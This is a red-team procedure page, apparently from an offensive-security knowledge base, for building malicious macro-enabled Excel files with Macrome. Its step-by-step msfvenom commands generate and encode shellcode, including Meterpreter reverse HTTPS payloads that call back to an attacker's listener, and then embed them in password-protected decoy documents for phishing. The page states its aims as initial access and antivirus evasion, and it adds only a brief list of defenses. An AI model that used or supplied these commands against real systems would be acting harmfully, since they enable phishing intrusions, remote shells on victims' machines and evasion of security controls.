---
id: 60925aa7-3fcd-4d24-b2c8-23fe540b07bb
name: Create-Malicious-Macro-Enabled-Excel-Documents-with-Macrome
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:23.242247+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Defense Evasion]]'
techniques:
  - '[[T1566.001]]'
  - '[[Malicious File]]'
  - '[[Command-Line Interface]]'
  - '[[Scripting]]'
sub_techniques:
  - '[[Windows Command Shell]]'
tags:
  - office-attacks
  - xlm-macrome
commands:
  - '[[commands/msfvenom-generate-x86-calc-shellcode]]'
  - '[[commands/msfvenom-generate-x64-calc-shellcode]]'
  - '[[commands/msfvenom-encode-x86-custom-payload]]'
  - '[[commands/msfvenom-encode-x64-custom-payload]]'
  - '[[commands/msfvenom-generate-x86-meterpreter-reverse-https]]'
  - '[[commands/msfvenom-generate-x64-meterpreter-reverse-https]]'
  - '[[commands/macrome-build-malicious-document]]'
platforms:
  - Windows
tools:
  - '[[tools/macrome]]'
  - '[[tools/msfvenom]]'
validated: true
---

# Create-Malicious-Macro-Enabled-Excel-Documents-with-Macrome

## Summary

This procedure outlines how to use the Macrome tool to create malicious macro-enabled Excel documents (.xls) that embed shellcode or VBA macros. When a victim opens the document and enables macros, it executes the embedded payload, such as launching calc.exe for testing or establishing a reverse shell via Metasploit. This is commonly used in phishing campaigns for initial access.

## Description

Macrome is a .NET-based tool specialized in generating malicious XLM macros for older Excel formats (.xls), allowing attackers to bypass some modern macro security features in VBA. The process involves generating shellcode payloads with msfvenom (for calc pop, custom, or Metasploit reverse shells), then embedding them into a decoy Excel document using Macrome. The resulting file appears legitimate but executes arbitrary code upon macro enablement. This targets Windows environments where Microsoft Excel is installed. Prerequisites include a decoy document and Metasploit Framework. Success leads to code execution on the victim's machine, enabling further compromise like reverse shells or persistence.

## Requirements

1. Kali Linux or similar environment with .NET SDK installed for Macrome.
2. Metasploit Framework installed for msfvenom payload generation.
3. A legitimate decoy Excel document (.xls) to disguise the malicious file.
4. Network access if using reverse shell payloads (attacker listener setup required).
5. Basic knowledge of shellcode encoding to avoid null bytes.

## Defense

- Disable macros by default in Office applications via Group Policy (e.g., Block macros from running in Office files from the Internet).
- Use antivirus/EDR solutions that scan for embedded shellcode in Office files (e.g., Office 365 ATP).
- Implement email attachment sandboxing and filtering for .xls files from untrusted sources.
- Educate users on phishing risks and prompt verification before enabling content.
- Monitor for anomalous processes spawned from Excel (e.g., calc.exe or suspicious network connections).

## Objectives

1. Generate architecture-specific shellcode payloads without null bytes.
2. Embed payloads into a macro-enabled Excel document using Macrome.
3. Create a password-protected malicious file for phishing delivery.
4. Achieve remote code execution upon victim interaction.

## Instructions

### Step 1: Generate Default Calculator Payloads for Testing

**Context**: Create simple x86 and x64 shellcode payloads that execute calc.exe when run. These serve as proof-of-concept to verify the macro execution without requiring a listener. Use alpha_mixed encoding for x86 and xor for x64 to avoid null bytes. This step produces binary files for embedding.

**Command** ([[commands/msfvenom-generate-x86-calc-shellcode]]):
```bash
msfvenom -a x86 -b '\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin
```

> This generates a 32-bit shellcode file popcalc.bin. Expected output is a binary file of ~500-600 bytes containing encoded instructions to spawn calc.exe in a thread.

**Command** ([[commands/msfvenom-generate-x64-calc-shellcode]]):
```bash
msfvenom -a x64 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin
```

> This generates a 64-bit counterpart popcalc64.bin, ~200-300 bytes. Verify file creation with ls -la popcalc*.bin; no output to console beyond potential warnings.

### Step 2: Generate Custom Shellcode Payloads

**Context**: For custom payloads, first prepare raw payload files (e.g., from exploits), then encode them with msfvenom to make them suitable for macro embedding. Shikata_ga_nai for x86 and xor_dynamic for x64 ensure compatibility and evasion of basic AV. Assumes payload86.bin and payload64.bin exist as input.

**Command** ([[commands/msfvenom-encode-x86-custom-payload]]):
```bash
msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\x00'
```

> Outputs shellcode-86.bin, encoded 32-bit custom payload. Success: Binary file created without errors; size depends on input payload.

**Command** ([[commands/msfvenom-encode-x64-custom-payload]]):
```bash
msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\x00'
```

> Outputs shellcode-64.bin for 64-bit. Verify with file shellcode-64.bin; expect raw binary output.

### Step 3: Generate Metasploit Reverse HTTPS Shellcode Payloads

**Context**: Produce Meterpreter reverse HTTPS payloads for persistent access. These connect back to the attacker's listener on port 443. Customize LHOST and LPORT. Encoding avoids nulls; use HTTPS for firewall evasion. Start a listener with msfconsole beforehand (e.g., multi/handler).

**Command** ([[commands/msfvenom-generate-x86-meterpreter-reverse-https]]):
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=$_LHOST LPORT=$_LPORT -b '\x00' -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin
```

> Generates msf86.bin for 32-bit reverse shell. Expected: Binary file; on execution, connects to listener showing Meterpreter session.

**Command** ([[commands/msfvenom-generate-x64-meterpreter-reverse-https]]):
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$_LHOST LPORT=$_LPORT -b '\x00' -a x64 --platform windows -e x64/xor_dynamic -f raw -o msf64.bin
```

> Generates msf64.bin for 64-bit. Success: File created; test by embedding and observing callback.

### Step 4: Build the Malicious Macro-Enabled Document

**Context**: Use Macrome to embed the generated shellcode or VBA macro into a decoy Excel file. For shellcode, use dotnet Macrome.dll build (binary embedding). For VBA, use Macrome build with --payload-type Macro. Protect with password to prompt user interaction. This creates the final .xls for phishing.

**Command** ([[commands/macrome-build-malicious-document]]):
```bash
Macrome build --decoy-document $_DECOY_DOCUMENT --payload-type Macro --payload $_VBA_MACRO_FILE --output-file-name $_OUTPUT_FILE --password $_PASSWORD
```

> Builds password-protected .xls with embedded VBA macro. Expected output: xor_obfuscated_macro_doc.xls (or specified name); verify by opening in Excel (macros prompt appears).

> Note: For shellcode embedding, use 'dotnet Macrome.dll build --decoy-document decoy.xls --payload popcalc.bin --payload64-bit popcalc64.bin' instead, adjusting paths. Test by enabling macros; calc should pop if successful.
